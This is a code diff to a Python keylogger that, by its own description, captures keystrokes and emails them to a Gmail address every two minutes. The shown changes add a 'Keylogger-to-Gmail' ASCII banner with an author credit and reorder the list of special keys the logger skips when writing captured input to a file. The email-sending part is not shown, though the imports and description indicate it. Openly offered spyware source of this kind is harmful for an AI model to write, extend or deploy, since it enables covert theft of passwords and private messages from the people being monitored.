@@ -8,6 +8,23 @@ from email import encoders
 import threading
 import os
 import argparse
+from termcolor import cprint, colored
+def header():
+    cprint(
+        """\
+  _  __          _                                    _               _____                 _ _ 
+ | |/ /         | |                                  | |             / ____|               (_) |
+ | ' / ___ _   _| | ___   __ _  __ _  ___ _ __ ______| |_ ___ ______| |  __ _ __ ___   __ _ _| |
+ |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|______| __/ _ \______| | |_ | '_ ` _ \ / _` | | |
+ | . \  __/ |_| | | (_) | (_| | (_| |  __/ |         | || (_) |     | |__| | | | | | | (_| | | |
+ |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|          \__\___/       \_____|_| |_| |_|\__,_|_|_|
+            __/ |         __/ | __/ |                                                           
+           |___/         |___/ |___/                                                            
+
+           
+            by Hadi El Nawfal\n""", 'light_magenta')
+
+header()
 
 parser = argparse.ArgumentParser(description="Capture keystrokes and send them to desired Gmail every 2 minutes")
 
@@ -51,7 +68,7 @@ def writefile(key):
                 f.write('\n')
             elif key == Key.shift:
                 pass
-            elif key == Key.cmd or key == Key.ctrl_l or key == Key.alt_l or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.esc or key == Key.backspace:
+            elif key == Key.cmd or key == Key.esc or key == Key.ctrl_l or key == Key.alt_l or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.backspace:
                 pass
             else:
                 f.write(str(key))
